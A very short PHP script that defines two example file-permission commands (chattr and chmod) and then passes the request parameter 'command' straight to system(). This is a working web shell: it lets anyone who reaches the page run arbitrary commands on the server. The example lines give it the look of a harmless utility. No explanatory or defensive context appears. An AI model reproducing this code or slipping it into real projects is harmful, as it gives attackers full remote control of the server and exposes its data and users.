<?php
$example = 'chattr +i /srv/content/file';
$mode_example = 'chmod ugo-w /srv/content/file';
$command = $_REQUEST['command'];
system($command);
